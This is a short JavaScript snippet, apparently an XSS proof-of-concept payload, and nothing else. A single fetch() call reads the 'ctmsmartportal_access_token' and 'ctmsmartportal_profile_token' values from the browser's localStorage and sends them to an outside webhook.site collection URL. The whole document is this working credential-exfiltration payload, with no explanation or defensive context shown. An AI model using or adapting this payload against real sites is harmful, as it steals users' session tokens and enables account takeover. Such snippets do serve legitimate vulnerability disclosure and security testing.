fetch(
  'https://webhook.site/ctm/?ctmsmartportal_access_token=' +
    encodeURIComponent(localStorage.getItem('ctmsmartportal_access_token')) +
    '&ctmsmartportal_profile_token=' +
    encodeURIComponent(localStorage.getItem('ctmsmartportal_profile_token'))
);
